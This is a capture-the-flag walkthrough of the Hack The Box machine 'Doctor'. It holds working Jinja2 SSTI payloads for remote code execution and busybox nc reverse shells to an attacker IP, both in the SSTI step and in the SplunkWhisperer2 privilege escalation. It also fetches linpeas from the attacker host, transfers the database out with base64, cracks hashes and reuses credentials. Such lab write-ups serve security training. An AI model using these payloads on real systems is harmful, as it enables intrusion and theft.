# Doctor - Easy

```sh
sudo vim /etc/hosts
# add doctor.htb

nmap -T4 -p- -A -Pn -v doctor.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 8.2p1 Ubuntu 4ubuntu0.1
    * 80/tcp - http - Apache httpd 2.4.41
    * 8089/tcp - ssl/http - Splunkd httpd

* ```nmap``` shows that the webpage for Splunk on port 8089 has a 'robots.txt' file as well

* checking the webpage on port 80, we have a doctor website; the content includes an email 'info@doctors.htb' - so we can update the ```/etc/hosts``` file with the subdomain 'doctors.htb'

* the website mentions the following names:

    * Dr. Jade Guzman
    * Dr. Hannah Ford
    * Dr. James Wilson
    * Elizabeth Anderson

* the webpage also has multiple links to other sub-pages, but they all lead to the same homepage, so we can ignore it

* checking the other domain found - 'http://doctors.htb' - this leads to a login page for Doctor Secure Messaging at 'http://doctors.htb/login?next=%2F'

* using ```wappalyzer```, we can see that this is a Flask webapp, and is using Flask 1.0.1, Python 3.8.2

* the login page has other links:

    * /home - for homepage, but needs login
    * /login - current login page
    * /register - sign up and create an account
    * /reset_password - forgot password link

* checking the source code for the login page, we get a comment saying "archive still under beta testing", and the comment includes a link to '/archive'

* checking the '/archive' page without logging in leads to a blank page; viewing the source code for this page hints that this could be a RSS feed

* we can create a test account in '/register' and login to explore the website further - after account creation, the website mentions a time limit of 20 minutes

* after logging in, it leads to '/home', the page has a link to a page at 'http://doctors.htb/home?page=1'

* there are other links from the homepage as well:

    * /post/new - new message
    * /account - account details
    * /logout - logout of account

* if we navigate to the first page at 'http://doctors.htb/home?page=1', we do not get anything

* even after logging in, the '/archive' page does not show any content

* for the 'page' parameter, we can try using other values like 0,1,2 or even negative values - to check for IDOR; this does not lead anywhere

* we can try creating a new post at '/post/new' - the fields for creating a new post are 'title' and 'content'

* if we create a new post, this gets posted in the homepage view, and we can infer the following info:

    * the post links the username to 'http://doctors.htb/user/test' - which leads to a view of all posts by the user 'test'

    * the post title links to 'http://doctors.htb/post/2' - which leads to a view, where we can update or delete the post itself

    * if we click on 'update', it leads to 'http://doctors.htb/post/2/update' - we can update the post details here

    * if we click on 'delete', the post gets deleted using the endpoint '/post/2/delete'

* firstly, as we have a '/user' endpoint, we can try fuzzing for valid users

* if we open the endpoint 'http://doctors.htb/user/test' in a private tab, to test without the session cookies, we can still access this page and get the user details - which means we do not need any cookies for the user enumeration:

    ```sh
    ffuf -u 'http://doctors.htb/user/FUZZ' -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt
    # this gives usernames 'test' & 'admin'

    ffuf -u 'http://doctors.htb/user/FUZZ' -w /usr/share/seclists/Usernames/Names/names.txt -s
    # testing with the names wordlist to find any other users
    ```

* username enumeration confirms that the 'admin' user exists

* if we navigate to 'http://doctors.htb/user/admin', we can see a post titled 'Doctor blog' with a message about the blog - but no useful info is found

* we can now test the '/post' endpoint next for any fuzzing attempts; initial testing shows that we can access the created posts without logging in, similar to usernames

* we can intercept the requests in Burp Suite to understand the format:

    * if we create a new post using '/post/new', we can see a POST request is sent to this endpoint with data 'title=test&content=content&submit=Post'

    * the response headers show the server details 'Werkzeug/1.0.1 Python/3.8.2'

    * if we update an existing post, a GET request to '/post/3/update' (here the third post is being updated) is sent initially; on updating the post, a POST request to the same endpoint is sent with same data format 'title=title&content=content&submit=Post'

* as we can create and update posts with any title & content, we can attempt different injection attacks for these fields - we can attempt manually before fuzzing:

    * [XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) - test with the basic payloads, for example -

        * ```<script>alert(document.domain.concat("\n").concat(window.origin))</script>```
        * ```<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>```
        * ```<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>```

    * XSS Injection payloads do not work, we can attempt SSTI next

    * [Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection) - test with different payloads for different template engines -

        * ```{{ 7*7 }}```
        * ```${ 7*7 }```
        * ```#{ 7*7 }```
        * ```<%= 7*7 %>```

    * testing with the SSTI payloads do not give any results as the posts do not evaluate the expressions

    * however, if we check the '/archive' page and its source code now, we can see that the expression is evaluated for some payloads - and this page evaluates the payload from the 'title' part of the post, as the page archives all titles from the posts

    * for example, if we use the payload ```{{ 7*7 }}``` in the 'title' for a new message, the source code of the '/archive' page evaluates the title to 49

    * this also works with a payload like ```{{7*'7'}}```, which evaluates the title to '7777777' - this shows that the webapp could be using Jinja2 or Twig likely (according to the flowchart from the SSTI PayloadsAllTheThings page)

* as SSTI is confirmed using the 'http://doctors.htb/archive' page, we can try to get RCE using the [SSTI to RCE payloads for Jinja2 in Hacktricks](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python):

    * the first payload - ```{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}``` - works for the 'title' parameter, and when we check the '/archive' page code, we can see the output of ```id``` command

    * as RCE is confirmed, we can try to get reverse shell now - setup a listener using ```nc -nvlp 4444```

    * next, we can use one of the reverse shell one-liner payloads and trigger it by visiting '/archive'

    * the payload ```{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('busybox nc 10.10.14.95 4444 -e sh').read() }}``` works and we get the reverse shell when visiting '/archive'

* in reverse shell:

    ```sh
    id
    # user 'web'

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # Enter twice

    pwd
    # '/home/web'

    ls -la /home
    # we have another user 'shaun'
    
    ls -la /home/shaun
    # most of the files cannot be read

    ls -la
    # check all files for current user

    cat blog.sh

    ls -la blog

    ls -la blog/flaskblog

    cat blog/flaskblog/config.py
    ```

* the 'config.py' file gives the creds 'doctor:doctor' and the secret key 1234, but these creds do not work for the user 'shaun'

* the file 'blog.sh' shows the SQLite DB at ```/home/web/blog/flaskblog/site.db``` is used; we can check this file for any secrets - transfer the file to attacker:

    ```sh
    cd blog/flaskblog

    md5sum site.db

    cat site.db | base64 -w 0; echo
    ```

    ```sh
    # on attacker
    echo -n "<base64-encoded-string>" | base64 -d > site.db

    md5sum site.db

    sqlite3 site.db

    .tables
    # lists tables 'post' and 'user'

    select * from user;
    ```

* the SQLite DB file gives us hashes for the 'admin' user; hash identifier tools show that this is a bcrypt hash - this can be confirmed by cracking the test user password

* we can try to crack this using ```hashcat```:

    ```sh
    vim adminhash
    # paste hash

    hashcat -m 3200 adminhash /usr/share/wordlists/rockyou.txt
    ```

* ```hashcat``` is unable to crack the hashes for the 'admin' user, so we need to continue our enumeration as 'web' in reverse shell

* we can use ```linpeas``` for enumeration - fetch script from attacker:

    ```sh
    wget http://10.10.14.95:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 5.4.0-42-generic, Ubuntu 20.04
    * kernel exploits like CVE-2021-3493 shown
    * ports 631 and 5000 found listening locally
    * ```/usr/bin/python3.8 = cap_sys_ptrace+ep``` capability found
    * unknown SUID binary ```/usr/sbin/exim-4.90-6```
    * ```/opt``` containing files
    * DB file ```/home/shaun/.cache/tracker/meta.db``` found
    * string 'Guitar123' found in log file ```/var/log/apache2/backup```

* we can try using the string 'Guitar123' as the password for 'shaun' user:

    ```sh
    ssh shaun@doctor.htb
    # this fails
    ```

* we can try using this to switch user locally:

    ```sh
    # in reverse shell

    su shaun
    # this works

    cd

    ls -la

    cat user.txt
    # user flag

    sudo -l
    # not available

    ls -la
    # enumerate other files

    ls -la .local

    ls -la .local/share/gvfs-metadata
    ```

* in user 'shaun' home directory, there is a directory ```.local/share/gvfs-metadata```, which contains a couple of files - 'root' & 'root-6c0b0b84.log'

* Googling for ```gvfs-metadata``` shows that it is a GNOME utility in Linux machines and is GNOME's userspace virtual filesystem

* ```gvfs``` works with GIO (GNOME input/output), and its logs can be viewed using ```gio``` tool according to Google:

    ```sh
    file .local/share/gvfs-metadata/*
    # cannot read this file normally as it is 'data'

    which gio
    # gio is available

    gio info --attributes=metadata:: .local/share/gvfs-metadata/root

    gio info --attributes=metadata:: .local/share/gvfs-metadata/root-6c0b0b84.log
    ```

* this does not give us anything useful, so we can continue our enumeration

* as we have the Splunk service running, we can check that for any info - it is running on port 8089 over HTTPS

* if we navigate to 'https://doctor.htb:8089', we can see a Splunk Atom Feed for ```splunkd```, and the version 8.0.5 is mentioned

* Googling for exploits associated with this version for Splunk leads to various results; we can try the [local privilege escalation in Splunk using SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2):

    * we can use the [Python version of SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)

    * this mentions default creds 'admin:changeme' - we can confirm this by navigating to the Splunk atom feed - services

    * trying to access the services page gives the authentication pop-up and the default creds do not work; however the creds 'shaun:Guitar123' work

    * as we have valid creds, we can try running the [remote version of SplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py):

        ```sh
        nc -nvlp 5555
        # setup listener for reverse shell

        python3 PySplunkWhisperer2_remote.py

        python3 PySplunkWhisperer2_remote.py --host doctor.htb --lhost 10.10.14.95 --username shaun --password Guitar123 --payload 'busybox nc 10.10.14.95 5555 -e sh'
        # this works and we get reverse shell
        ```

        ```sh
        # in reverse shell

        id
        # root

        ls -la /root

        cat /root/root.txt
        # root flag
        ```
